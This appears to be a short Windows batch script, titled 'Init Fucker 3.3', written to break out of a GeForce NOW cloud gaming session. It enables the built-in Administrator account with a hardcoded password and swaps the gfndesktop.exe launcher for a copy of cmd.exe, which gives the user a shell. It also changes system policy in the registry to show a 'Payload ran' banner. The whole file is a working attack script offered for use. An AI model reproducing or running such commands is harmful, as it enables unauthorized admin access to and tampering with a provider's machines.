:: Init Fucker 3.3
:: Edit by Gabe

:: Enable Admin
net user Administrator /active:yes
net user Administrator Gabe975!Ga

:: Other
taskkill /f /im gfndesktop.exe
del "C:\Windows\gfndesktop.exe"
copy "C:\Windows\System32\cmd.exe" "C:\Windows\gfndesktop.exe"
REG ADD HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization /v LockScreenImage /t REG_SZ /d "C:\PerfLogs\dark.png" /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /t REG_SZ /d "Gabe's GFN Admin" /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /t REG_SZ /d "Payload ran. Welcome to GFN Admin." /f
copy "C:\Windows\System32\cmd.exe" "C:\Gabe.washere" /y